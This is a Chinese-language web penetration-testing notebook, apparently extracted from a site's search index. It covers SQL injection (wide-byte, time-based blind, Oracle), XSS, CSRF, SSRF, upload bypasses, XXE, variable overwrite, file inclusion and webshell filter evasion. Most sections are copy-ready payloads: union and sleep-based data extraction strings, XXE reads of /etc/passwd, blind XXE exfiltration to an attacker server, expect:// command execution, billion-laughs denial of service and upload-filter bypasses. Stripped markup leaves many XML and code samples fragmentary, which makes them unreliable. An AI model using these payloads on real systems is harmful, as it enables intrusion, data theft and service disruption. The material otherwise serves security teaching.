访问1.php?username=admin'会得到对应的ID【好比id为10】 访问2.php?id=10，发现返回一堆报错 再次访问1.php?username=admin' order by 1 %23获取一个全新的ID 再次访问2.php?id=11会发现页面没有任何提示 再次访问1.php?username=admin' order by 10 %23获取一个全新的ID 再次访问2.php?id=12发现页面在此报错 通过不断尝试判断其中的数据【也可以尝试报错注入】 代码分析 1.php【用户注册】 当访问username=test'&passwd=123456时，执行的SQL语句是insert into users(username, passwd) values ('test\\'', 'qwasfqfzxhikcbi123') 2.php 首先将GET参数ID转成int类型（防止拼接到SQL语句时，存在SQL漏洞），然后将users表中获取对应的username，家这道表中查询username对应的数据 但是此处没有对$usernmae进行转义，在第一步中注册的用户名test'，执行的SQL语句是select * from users where 'username'='test'' "},"NoteBook/SQL注入/MySQL数据库/宽字节注入.html":{"url":"NoteBook/SQL注入/MySQL数据库/宽字节注入.html","title":"宽字节注入","keywords":"","body":"代码分析 w The Query String is \" . $sql . \"\"; ?> 魔术引号：magc_quotes_gpc 函数在php中的作用是判断解析用户提交的数据（get、post、cookie过来的数据）中有特殊字符（单引号(')、双引号(\")、反斜线(/)、NULL字符(NULL)）就会在前面加上一个\"\\\"来过 gbk编码和utf-8编码 ascii编码是一个字节 gbk编码是2个字节 utf-8编码是3个字节 GET传参 当特殊字符被反斜杠转义时，在闭合的前方加上一个字符，让这个字符和反斜杠组成一个新的gbk编码的汉字 ?id=1 %aa' and 1=1 -- 123 select *from user where id='1�\\' and 1=1 -- 123' 数据库 ?id=1 %df' union select 1,2,3 -- 123 ?id=1 %df' union select 1,user(),database() -- 123 数据表 一起输出 : ?id=1 %df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() -- 123 一个一个输出 : ?id=1 %df' union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 -- 123 数据字段 这里输入table_name=后面要加单引号，会被转义，这里有两种方法绕过 子查询 16进制转码 一起输出 : ?id=1 %df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema = database() limit 0,1) -- 123 ?id=1 %df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=16进制的表名(例如 : user : 0x75736572) -- 123 一个一个输出 : ?id=1 %df' union select 1,2,column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema = database() limit 0,1) limit 0,1 -- 123 ?id=1 %df' union select 1,2,column_name from information_schema.columns where table_name=16进制的表名(例如 : user : 0x75736572) limit 0,1 -- 123 数据 一起输出 : ?id=1 %df' union select 1,2,group_concat(字段名) from 表名 -- 123 一个一个输出 : ?id=1 %df' union select 1,2,字段名 from 表名 limit 0,1 -- 123 POST传参 使用burp抓包修改hex值 burp抓包 username=a%27+%29+or+1%3D1+--+qwe&password=123 找到a对应的hex值(61)，改成df 利用utf-8的特性，加上反斜杠组合成两个gbk格式的汉子 我') or 1=1 -- 123 注入方式和GET注入一样，只是需要将%df替换成汉字或抓包修改其hex值 两者区别 GET是通过一个字符加上另一个字符组合成一个gbk格式的汉字 POST是通过一个汉字加上一个字符组合成两个gbk格式的汉字 因为POST不会通过url编码，所以需要自己抓包修改16进制值 "},"NoteBook/SQL注入/MySQL数据库/延时盲注.html":{"url":"NoteBook/SQL注入/MySQL数据库/延时盲注.html","title":"延时盲注","keywords":"","body":"代码分析 no\"); } $result = mysqli_query($con, \"select * from users where 'id' ='\" . $id . \"'\"); $row = mysqli_fetch_array($result); if ($row){ exit(\"yse\"); }else{ exit(\"no\"); } ?> 此处依旧可以使用布尔盲注或其他注入方法，这里使用时间注入 当访问id=1' and if(ord(substr(user(), 1, 1))=144, sleep(3), 1) %23，执行的SQL语句为select * from users where 'id'='1' and if(ord(substr(user(), 1, 1)=144, sleep(3), 1)%23'，如果user()查询的用户的第一个字母的ascii为144那么成立，就会延迟3秒，通过延迟来判断SQL语句的运行结果 界面返回值只有一种True，无论输入何值，返回的情况都是会按照正常的来处理，加入特定的函数，通过查看WEB页面返回时间差来判断注入的语句是否正确 函数 sleep() : 延时 if(expr1, expr2, expr3) : 判断 这里的if(expr1,expr2,expr3)是判断语句如果第一个语句正确就执行第二个语句如果错误执行第三个语句，这样就可以检测是否正确 流程 判断注入 ?id=1 and sleep(5) ?id=1 or sleep(5) 数据库 查看库名长度 ?id=1\" and if(length(database())=12,sleep(10),1)-- qwe 库名 ?id=1\" and if(left(database(),1) = 'a',sleep(10),1)-- qwe ?id=1\" and if(left(database(),3) = 'abx',sleep(10),1)-- qwe ……………… ?id=1\" and if(left(database(),12) = 'abxbsbdfbwhf',sleep(10),1)-- qwe 数据表 查看当前数据表的个数 ?id=1\" and if((select count(table_name) from information_schema.tables where table_schema=database())=3,sleep(10),1)-- qwe 数据表长度 第一个数据表的长度 ?id=1\" and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=长度,sleep(10),1)-- qwe 第二个数据表的长度 ?id=1\" and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=长度,sleep(10),1)-- qwe 数据表 第一个数据表 ?id=1\" and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) = ascii的字符数字,sleep(10),1)-- qwe ?id=1\" and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),2,1)) = ascii的字符数字,sleep(10),1)-- qwe 第二个数据表 ?id=1\" and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 1,1),1,1)) = ascii的字符数字,sleep(10),1)-- qwe ?id=1\" and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 1,1),2,1)) = ascii的字符数字,sleep(10),1)-- qwe 数据字段 字段个数 第一个数据表的长度 ?id=1\" and if((select count(column_name) from information_schema.columns where table_name='第一个数据表') = 个数 ,sleep(10),1)-- qwe 第二个数据表的长度 ?id=1\" and if((select count(column_name) from information_schema.columns where table_name='第二个数据表') = 个数 ,sleep(10),1)-- qwe 字段长度 第一个表 第一个数据字段 : ?id=1\" and if(length(substr((select column_name from information_schema.columns where table_name='第一个表' limit 0,1),1))=个数,sleep(10),1)-- qwe 第二个数据字段 : ?id=1\" and if(length(substr((select column_name from information_schema.columns where table_name='第一个表' limit 1,1),1))=个数,sleep(10),1)-- qwe 第二个表 第一个数据字段 : ?id=1\" and if(length(substr((select column_name from information_schema.columns where table_name='第二个表' limit 0,1),1))=长度,sleep(10),1)-- qwe 第二个数据字段 : ?id=1\" and if(length(substr((select column_name from information_schema.columns where table_name='第二个表' limit 1,1),1))=长度,sleep(10),1)-- qwe 字段 第一个表 第一个字段 : and if(ascii(substr((select column_name from information_schema.columns where table_name = '第一个表' limit 0,1),1,1)) = ascii的字符数,sleep(10),1)-- qwe and if(ascii(substr((select column_name from information_schema.columns where table_name = '第一个表' limit 0,1),2,1)) = ascii的字符数,sleep(10),1)-- qwe 第二个字段 : and if(ascii(substr((select column_name from information_schema.columns where table_name = '第一个表' limit 1,1),1,1)) = ascii的字符数,sleep(10),1)-- qwe and if(ascii(substr((select column_name from information_schema.columns where table_name = '第一个表' limit 1,1),2,1)) = ascii的字符数,sleep(10),1)-- qwe 第二个表 第一个字段 : and if(ascii(substr((select column_name from information_schema.columns where table_name = '第二个表' limit 0,1),1,1)) = ascii的字符数,sleep(10),1)-- qwe and if(ascii(substr((select column_name from information_schema.columns where table_name = '第二个表' limit 0,1),2,1)) = ascii的字符数,sleep(10),1)-- qwe 第二个字段 : and if(ascii(substr((select column_name from information_schema.columns where table_name = '第二个表' limit 1,1),1,1)) = ascii的字符数,sleep(10),1)-- qwe and if(ascii(substr((select column_name from information_schema.columns where table_name = '第二个表' limit 1,1),2,1)) = ascii的字符数,sleep(10),1)-- qwe 数据 数据个数 第一个表 第一个字段数据个数 : ?id=1\" and if((select count(第一个字段) from 第一个表) = 个数,sleep(10),1)-- qwe 第二个字段数据个数 : ?id=1\" and if((select count(第二个字段) from 第一个表) = 个数,sleep(10),1)-- qwe 第二个表 第一个字段数据个数 : ?id=1\" and if((select count(第一个字段) from 第二个表) = 个数,sleep(10),1)-- qwe 第二个字段数据个数 : ?id=1\" and if((select count(第二个字段) from 第二个表) = 个数,sleep(10),1)-- qwe 数据长度 第一个表 第一个字段 第一个字段第一个数据 : ?id=1\" and if((select length(第一个字段) from 第一个表 limit 0,1) = 长度,sleep(10),1)-- qwe 第一个字段第二个数据 : ?id=1\" and if((select length(第一个字段) from 第一个表 limit 1,1) = 长度,sleep(10),1)-- qwe 第二个字段 第一个字段第一个数据 : ?id=1\" and if((select length(第二个字段) from 第一个表 limit 0,1) = 长度,sleep(10),1)-- qwe 第一个字段第二个数据 : ?id=1\" and if((select length(第二个字段) from 第一个表 limit 1,1) = 长度,sleep(10),1)-- qwe 第二个表 第一个字段 第一个字段第一个数据 : ?id=1\" and if((select length(第一个字段) from 第二个表 limit 0,1) = 长度,sleep(10),1)-- qwe 第一个字段第二个数据 : ?id=1\" and if((select length(第一个字段) from 第二个表 limit 1,1) = 长度,sleep(10),1)-- qwe 第二个字段 第一个字段第一个数据 : ?id=1\" and if((select length(第一个字段) from 第二个表 limit 0,1) = 长度,sleep(10),1)-- qwe 第一个字段第二个数据 : ?id=1\" and if((select length(第一个字段) from 第二个表 limit 1,1) = 长度,sleep(10),1)-- qwe 第二个表 第一个字段 第一个数据 : ?id=1\" and if(ascii(substr((select 第一个字段 from 第一个表 limit 0,1),1,1)) = ascii数字对应字符,sleep(10),1)-- qwe ?id=1\" and if(ascii(substr((select 第一个字段 from 第一个表 limit 0,1),2,1)) = ascii数字对应字符,sleep(10),1)-- qwe 第二个数据 : ?id=1\" and if(ascii(substr((select 第一个字段 from 第一个表 limit 1,1),1,1)) = ascii数字对应字符,sleep(10),1)-- qwe ?id=1\" and if(ascii(substr((select 第一个字段 from 第一个表 limit 1,1),2,1)) = ascii数字对应字符,sleep(10),1)-- qwe 第二个字段 第一个数据 : ?id=1\" and if(ascii(substr((select 第二个字段 from 第一个表 limit 0,1),1,1)) = ascii数字对应字符,sleep(10),1)-- qwe ?id=1\" and if(ascii(substr((select 第二个字段 from 第一个表 limit 0,1),2,1)) = ascii数字对应字符,sleep(10),1)-- qwe 第一个数据 : ?id=1\" and if(ascii(substr((select 第二个字段 from 第一个表 limit 1,1),1,1)) = ascii数字对应字符,sleep(10),1)-- qwe ?id=1\" and if(ascii(substr((select 第二个字段 from 第一个表 limit 1,1),2,1)) = ascii数字对应字符,sleep(10),1)-- qwe "},"NoteBook/SQL注入/Oracle数据库/":{"url":"NoteBook/SQL注入/Oracle数据库/","title":"Oracle","keywords":"","body":"查询出所有的表 select * from all_tables 查询出当前用户的表 select * from user_tables 查询出所有的字段 select*from all_tab_columns 查询出当前用户的字段 select*from user_tab_columns 查版本 select*from v$version 查询第一行 select * from all_tables where rownum=1 查询多行，参考实现limit的功能的 实现limit的功能 rownum输出 select * from all_tables where rownum=1; // 输出一行; select * from all_tables where rownum 查询结果去掉没用的 select password from admin where password<>'asd123'; select password from admin where password<>'asd123' and password<>'zxc12312ws'; 基于行数别名的子查询 查询admin表中的username字段，并在字段前面加上行号，想要利用行号就必须得取个别名，不然会和外面查询的rownum冲突 : select rownum as rr, username from admin; select username from (select rownum as rr, username from admin) where rr = 1; 想要改变行数只需要改变行号就可以了 : select username from (select rownum as rr, username from admin) where rr = 2; "},"NoteBook/SQL注入/Oracle数据库/报错注入.html":{"url":"NoteBook/SQL注入/Oracle数据库/报错注入.html","title":"报错注入","keywords":"","body":"报错注入 需要用到的函数 ==CTXSYS.DRITHSX.SN(用户,(查询的语句))== 查询数据库版本 去查询关于主题的对应关键字，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询的内容） 查询表 and 1= ctxsys.drithsx.sn(1,(select table_name from (select rownum r,table_name from user_tables) where r=1)) 数据字段 and 1= ctxsys.drithsx.sn(1,(select column_name from (select rownum r,column_name from user_tab_columns where table_name='ADMIN') where r=1)) 数据 and 1= ctxsys.drithsx.sn(1,(select uname from (select rownum r,uname from admin) where r=1)) "},"NoteBook/SQL注入/Oracle数据库/显错注入.html":{"url":"NoteBook/SQL注入/Oracle数据库/显错注入.html","title":"显错注入","keywords":"","body":" 查询当前数据库字段，查看回显点 order by n union all select null,null,null,null from user_tables 查询当前数据库(表)（oracle弱化了库，强调用户） union all select null,table_name,null,null from user_tables 查询当前数据表中字段 union all select null,column_name,null,null from user_tab_columns where table_name = '表名' 查询数据 union all select null,null,null,字段名 from 表名 只允许输出一条数据的 模拟limit union all select null,null,null,字段名 from (select rownum as r, 字段名 from 表名) where r=1 查询结果去掉没用的 union all select null,null,null,字段名 from 字段名 where 字段名<>数据 and 字段名<>数据 "},"NoteBook/跨站伪造/":{"url":"NoteBook/跨站伪造/","title":"跨站伪造","keywords":"","body":""},"NoteBook/跨站伪造/XSS.html":{"url":"NoteBook/跨站伪造/XSS.html","title":"XSS","keywords":"","body":"XSS跨站 xss就是用户输入的传参会被当做前端代码执行 XSS可以做什么 获取cookie (不能跨域名，跨端口，跨IP) 获取cookie的代码只会在一个站点上获取，其他站点上的cookie无法获取 获取内网IP 获取浏览器保存的明文密码 截取网页屏幕 网页上的键盘记录 XSS种类 反射性xss 你提交的数据支队本次访问产生了影响 存储型xss 提交的数据存入了数据库，别人访问这个页面的时候就会自动获取数据 DOM型xss 基于文档对象模型Document Object Model的一种漏洞,DOM是一个与平台、编程无关的接口,允许脚本动态的访问和更新文档内容结构样式(原本不应该出现xss的地方，但是经过JavaScript的操作之后产生了xss) 除法XSS的3种方法 标签触发 alert(123) 123 伪协议 不同于网络上真实存在的协议如：http:// https:// ftp:// 伪协议只有关联应用能够用 如：php:// tencent://(关联qq) javascript: 声明url的主体是任意javascript代码 如：javascript:alert(1) js容错率高 哪里能用执行哪里 单引号(')可以闭合双引号(\") 事件触发方法 这是在路径不正确的情况下弹框测试 这是在图片名字上进行篡改然后弹框 这是在value里面单独写一个'搞的鬼 这是在value里面进行双引号闭合(浏览器的特性) *-+ 等等诸如此类 反射 你提交的数据成功实现了XSS，但是仅仅只是对你这次访问产生了影响，是非持久性攻击 存储 提交的数据存入了数据库，别人访问这个页面的时候就会继续执行恶意代码 DOM js中会把+变成p 也就是 => dom的操作 Document的操作 => js操作 document.cookie document.body document.domain 返回当前文档的域名 document.lastModified (判断页面是否是动态还是静态,动态页面打印出来的数据是会不断变化的,而静态是不会发生改变的) document.referrer 返回载入当前文档的文档url document.title 返回当前文档的标题 document.url 返回当前文档的url Document对象方法 document.write() 打印数据 --> js语句 会解析某些编码(native编码) document.write('alert(1)') 把里面的js语句转化成native编码才可以 document.write('\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e') 就可以弹窗了 在做xss时候 被拦截了那么是不是可以通过js代码的解码功能进行绕过 document.write() innerHTML eval() "},"NoteBook/跨站伪造/CSRF.html":{"url":"NoteBook/跨站伪造/CSRF.html","title":"CSRF","keywords":"","body":"CSRF 流程 graph LR A网站 --> 用户登录有A的Cookie B网站 --> 黑客创建的网站 黑客创建的网站 --> A[JS代码 修改A网站的个人信息的] 用户 --> |访问| B[黑客搭建的网站] B --> 网站会执行JS代码,达到修改用户个人信息的效果 【==所谓网站的交互，任何功能都是发送数据包实现的==】 想要篡改A网站某用户的个人信息 搭建了一个B网站，然后JS留了修改A网站个人资料的数据包，骗取浏览B网站的某用户在登录A网站的情况下来访问 无意访问了B，js调用修改信息代码发送个给A，浏览器发现是访问A网站的会把这个用户在A网站已登录成功的Cookie添加到数据包，A网站一看你的Cookie正确，就会认为你是本人，会修改成功 成因 CSRF漏洞的成因就是网站的cookie在浏览器关闭时不会过期。 cookie一般的过期时间是一次会话，一次会话就是关闭浏览器 cookie存在于浏览器中，你可能不止访问一个网站，所以浏览器中的cookie不止一个。 当访问网站的时候，浏览器会判定你访问的时什么站，发送相应的数据包，其中包含该网站的Cookie 注意： XSS 偷cookie CSRF 利用cookie ，浏览器会自动填充cookie CSRF的核心 1、验证码是他最好的防御方法。 修改密码，需要数验证码。 任何操作都价格验证码可以完全杜绝CSRF 2、token字段 开发为了安全，设置了一个，每个请求表单中都存在一个字段，这个字段就是token cookie里面的token token是现有的最好的方法 如何判断某网站是否存在csrf 1，注册一个账号 2，通过burp抓取 修改个人信息的数据包 3，使用burp工具生成CSRF攻击代码（右键数据包-相关工具-CSRF Poc 生成） 4，复制生成的代码、另存为1.html文件 5，使用浏览器打开1.html文件 特殊函数 Referer字段：告诉服务器我是从哪个网站跳转过来的 setTimeout函数：延时执行 Iframe：内敛标签 通过修改高度和长度，达到隐藏效果 php可以调用cmd，php shell 有时候会变成cmd shell 如何判断某网站是否存在csrf 1，注册一个账号 2，通过burp抓取 修改个人信息的数据包 3，使用burp工具生成CSRF攻击代码（右键数据包-相关工具-CSRF Poc 生成） 4，复制生成的代码、另存为1.html文件 5，使用浏览器打开1.html文件 攻击流程 1. 注册两个号进行抓包测试 2. 抓包查看是否有token（如果有，尝试找找规律，一般有token都是随机的） 3. 抓包构建CSRF攻击代码，burp右键的相关工具 CSRF Poc 4. 构建好的Poc保存为html文件，进行点击尝试修改 如果想要让它自己触发，加上下面代码就会自动触发 "},"NoteBook/跨站伪造/SSRF.html":{"url":"NoteBook/跨站伪造/SSRF.html","title":"SSRF","keywords":"","body":"满足的条件 让目标站点发起网络请求，可以控制目标去访问百度 DNS注入通过load_file()函数读取远程地址 ==> 让目标站点发起网络请求 要能访问公网或者内网 如何挖掘SSRF 黑盒 看参数（传参出现域名、协议、文件等可能存在） 白盒 可以发起请求的函数 如何利用 file协议探测文件内容（?url=file:///c:/www/config.php） dict协议扫描端口（?url=dict://127.0.0.1:80） 端口开放会显示报错消息 端口关闭无任何显示 如何防御 写一个正则，不允许访问本机、内网 "},"NoteBook/文件上传/":{"url":"NoteBook/文件上传/","title":"文件上传","keywords":"","body":""},"NoteBook/文件上传/文件上传.html":{"url":"NoteBook/文件上传/文件上传.html","title":"文件上传","keywords":"","body":"核心：通过各种手段把文件上传上去 黑名单【名单上的东西会拦截】 检测是否前端后端检测 前端验证可以利用抓包进行修改 后缀替代 jsp、jsx、jspf都会被当作 jsp 执行 asp、asa、cer、asps都会被当作 asp 执行 php、php3、php4、php5、phtml都会被当作 php 执行 exe、exee都会被当作 exe 执行 修改文件类型 上传php文件时，会要求匹配图片类型的，如果不符，上传失败 .htaccess绕过 AddType application/x-httpd-php .jpg // jpg文件被当做php文件解析 大小写绕过 pHp phP Php 空格绕过 .php后面加一个空格 .php 小数点绕过 1.php 1.php. ::$DATA(Windows文件流) a.php => a.php::$DATA 两者是相互等价的 所以 上传a.php::$DATA 小技巧 echo 123 > a.txt:1.txt 只会创建一个a.txt，没有1.txt，打开a.txt里面什么都没有，但是打开a.txt:1.txt就会看见里面的内容 逻辑错误（只校验一次） php. . (先检测一次\".\"，在检验一次空格，最后剩下php.，也可以绕过) 双写绕过 pphphp (遇到发现php替换成空格，由于只检测了一次，剩下php了) 白名单【名单上的会放行】 GET传参 %00截断 %00截断只有在PHP5.3版本以下才会出现 通过修改保存修改路径，后面添加php文件名加上%00进行截断，上传的图片本应该会按照代码直接移动到保存路径，例如192.168.30.250/uploads/1.php%00/asdas123.jpg，但是windows读到%00会认为结束了，不会考虑后面的，所以就把文件赋值到了1.php中 POST传参 00截断 POST传参想要进行截断%00是不能的（%00专属于GET请求），需要修改必修对其16进制进行修改 GIF图片绕过 利用GIF的前几行不会被重新渲染进行制作图片马 条件竞争 先上传，之后移动，最后检测合格不合格（合格重新修改名字，不合格就删除） 所以就出现了如果一个不停上传，一个不停访问，就会访问到上传上的文件 需要两个数据包 访问上传的数据包 访问上传后图片位置的数据包 之后进行跑数据包 上传包的线城是80、访问上传地址的数据包线程60 "},"NoteBook/逻辑漏洞/":{"url":"NoteBook/逻辑漏洞/","title":"逻辑漏洞","keywords":"","body":""},"NoteBook/逻辑漏洞/XXE.html":{"url":"NoteBook/逻辑漏洞/XXE.html","title":"XXE","keywords":"","body":"什么是XML 定义 XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 特点 仅仅只是纯文本，不会做任何事情 可以发明自己的标签 存储数据 文档结构 XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 ]]]> Dave Tom Reminder You are a good man DTD 内部声明DTD 引用外部DTD 内外部DTD文档结合： DTD中的一些重要的关键字 DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） 实体类别介绍 实体主要分为一下四类 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 参数实体用%实体名称申明，引用时也用%实体名称 其余实体直接用实体名称申明，引用时用&实体名称 参数实体只能在DTD中申明，DTD中引用 其余实体只能在DTD中申明，可在xml文档中引用 DTD 实体声明 内部实体声明 一个实体由三部分构成:&符号, 实体名称, 分号 (;) 这里&不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&符号会被认为是参数间的连接符号，示例： ]> &xxe; 外部实体声明 XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种： file:///path/to/file.ext http://url php://filter/read=convert.base64-encode/resource=conf.php 外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议 外部实体的默认协议 示例： ]> &xxe; // 这种写法则调用了本地计算机的文件/etc/passwd，XML内容被解析后，文件内容便通过&xxe被存放在了methodname元素中，造成了敏感信息的泄露。 参数实体声明 or 示例： %xxe;]> &evil; 外部evil.dtd中的内容。 引用公共实体 什么是XML外部实体攻击? 有了XML实体，关键字 \"SYSTEM\" 会令XML解析器从URI中读取内容，并允许它在XML文档中被替换 攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现 攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件) 下面的代码将获取系统上folder/file的内容并呈献给用户 Code1 ]> &passwd; Code2 ]> &entityex; Code3 ]> &xxe; Code4 ]> &xxe; 以Code1代码为例 XML外部实体 \"passwd\" 被赋予的值为：file:///etc/passwd 在解析XML文档的过程中，实体\"passwd\"的值会被替换为URI(file:///etc/passwd)内容值(也就是passwd文件的内容) 关键字\"SYSTEM\"会告诉XML解析器，\"passwd\"实体的值将从其后的URI中读取。 怎么甄别一个XML实体攻击漏洞? 最直接的回答就是： 甄别那些接受XML作为输入内容的端点 但是有时候，这些端点可能并不是那么明显 比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式 比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。 例如wsdl（web服务描述语言）。或者一些常见的采用xml的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。 xxe漏洞检测 第一步先检测XML是否会被成功解析： ] &name; // 如果页面输出了my name is nMask，说明xml文件可以被解析 第二步检测服务器是否支持DTD引用外部实体： %name; ]> // 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求index.html的请求 从PHP代码层面上 最开始，引入一个file_get_contents函数，将整个XML数据读入data字符串中 然后交给php的xml解析函数simplexml_load_string()解析，解析后的数据赋给xml变量。 这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。 name; ?> xxe漏洞的危害 xxe漏洞的危害有很多，比如可以文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，这里就读取任意文件的利用方式进行测试。 读取任意文件 有回显情况 ]> &f; EOF; $data = simplexml_load_string($xml); print_r($data); ?> 访问XML.php可以读取etc/passwd文件内容 该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码 后登录tomcat的manager部署webshell。 实例展示： 可以使用如下的两种方式进行XXE注入攻击。 ]> &xxe; %xxe;]> &evil; 外部evil DTD中的内容 当然也可以进行内网站点的入侵。 以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。 无回显的情况 blind xxe漏洞方案1： 对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 创建test.php写入以下内容： 创建index.php写入以下内容： %remote; %all; %send; ]> EOF; $data = simplexml_load_string($xml) ; echo \"\" ; print_r($data) ; ?> 创建test.xml并写入以下内容： \"> 当访问http://localhost/index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。 blind xxe漏洞方案2： 可以将文件内容发送到远程服务器，然后读取。 %f; ]> &b; $data = simplexml_load_string($xml); print_r($data); 远程服务器的evil DTD文件内容 blind xxe漏洞方案3： 可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。 # /etc/issue %dtd; %send; ]> evil.dtd的内容，内部的%号要进行实体编码成&#x25。 ” > %all; 有报错直接查看报错信息。 无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。 这里列举几个案例： 恶意引入外部实体1： XML内容 ]> &b; 恶意引入外部实体2： XML内容 %d; ]> &b; DTD文件（evil.dtd）内容： 恶意引入外部实体3 XML内容 ]> &b; DTD文件内容 恶意引入外部实体(4) ]> &xxe; 命令执行 php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。 # id ]> &f; EOF; $data = simplexml_load_string($xml); print_r($data); ?> 该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。 内网探测/SSRF 由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。 ]> &f; EOF; $data = simplexml_load_string($xml); print_r($data); ?> 攻击内网网站 该CASE是攻击内网struts2网站，远程执行系统命令。 拒绝服务攻击 To crash the server / Cause denial of service: ]> &lol9; 上面样例代码2中的XXE漏洞攻击就是著名的’billion laughs’ 攻击。 (https://en.wikipedia.org/wiki/Billion_laughs)，该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha!”字符串，从而导致 DDoS 攻击。 原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻 击。除了这些，攻击者还可以读取服务器上的敏感数据，还能通过端口扫描，获取后端系统的开放端口。 XXE漏洞修复与防御 xxe漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也 不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己 声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于 XXE漏洞的攻击。 方案一 使用开发语言提供的禁用外部实体的方法 PHP libxml_disable_entity_loader(true); JAVA DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 方案二 过滤用户提交的XML数据 过滤关键词： "},"NoteBook/逻辑漏洞/变量覆盖.html":{"url":"NoteBook/逻辑漏洞/变量覆盖.html","title":"变量覆盖","keywords":"","body":"变量覆盖指的是可以用我们的传参值替换程序原有的变量值 导致变量覆盖的漏洞场景有 $$使用不当 $_value) {$$_key=addslashes($_value);}} echo $a; ?> 这个代码会接受我们的GET提交、POST提交、COOKIE参数，将这个接受来的参数依次放入$request$_key=>$_value 这是个数组解析，实际上就是键值分离正 常而言$a = 1是一个定值，但是因为$$_key的缘故,当我传参a=2;那么$$_key=addslashes($_value);就变为了$a = 2 . extract()函数 \"Cat\",\"b\" => \"Dog\", \"c\" => \"Horse\"); extract($my_array); echo \"\\$a = $a; \\$b = $b; \\$c = $c\"; ?> 运行结果：$a = Cat; $b = Dog; $c = Horse parse_str()函数 \"; echo $age; ?> 输出了zkaq和60 那么parse_str(\"name=Bill&age=60\") 相当于完成了$name ='zkaq'和$age ='60' import_request_variables()函数 开启了全局变量注册 "},"NoteBook/逻辑漏洞/文件包含.html":{"url":"NoteBook/逻辑漏洞/文件包含.html","title":"文件包含","keywords":"","body":"本地文件包含 LFI 远程文件包含 RFI PHP默认不开启远程文件包含 开启需要在配置文件（php-ini）中添加 allow_url_include=On; 文件包含函数 include 如果包含文件不存在，不影响后面的代码执行 require 如果包含文件不存在，会影响后面的代码执行 include_once、require_once 如果文件被包含过一次了，就不会重复包含 利用SMB服务开启某个设置来达到远程文件包含（安全课） allow_url_include=On "},"NoteBook/ByPass/":{"url":"NoteBook/ByPass/","title":"ByPass","keywords":"","body":""},"NoteBook/ByPass/WebShell绕过.html":{"url":"NoteBook/ByPass/WebShell绕过.html","title":"ByPass","keywords":"","body":"php一句话木马 拦截进行替换 替换eval() assert() 替换$_REQUEST['a'] 写$_REQUEST无报错，加上 '[]' 后报错 利用end()绕过，end()函数的意义：输出数组中当前元素和最后一个元素的值 